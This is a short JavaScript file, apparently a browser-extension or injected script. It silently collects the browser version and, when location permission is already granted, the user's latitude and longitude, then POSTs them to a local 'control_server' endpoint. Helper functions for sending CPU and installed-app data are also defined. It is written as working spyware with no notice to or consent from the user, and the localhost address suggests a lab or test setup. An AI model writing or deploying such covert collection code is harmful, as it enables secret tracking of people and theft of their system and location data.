
//OS System
fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( window.navigator.appVersion),
        headers:{"Content-Type": "application/json"}
        }
)

//CPU INFO
function logCPU(C){
fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( C),
        headers:{"Content-Type": "application/json"}
        }
)
}
function logExApp(C){

        fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( C),
        headers:{"Content-Type": "application/json"}
        }
    )   
    }


//chrome.system.cpu.getInfo(logCPU(info))

function captureGeolocation(){

        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            fetch('http://127.0.0.1:5000/g',
            {
            method: "POST",
            mode: 'no-cors', 
            body: JSON.stringify( {lat: latitude, lon : longitude}),
            headers:{"Content-Type": "application/json"}
            }
    )});}



navigator.permissions
    .query({ name: "geolocation" })
    .then(function (_a) {
    var state = _a.state;
    if (state === "granted") {
        captureGeolocation();
    }
}); 





//Display INFO (for no particular reason)
fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( window.navigator.appVersion),
        headers:{"Content-Type": "application/json"}
        }
)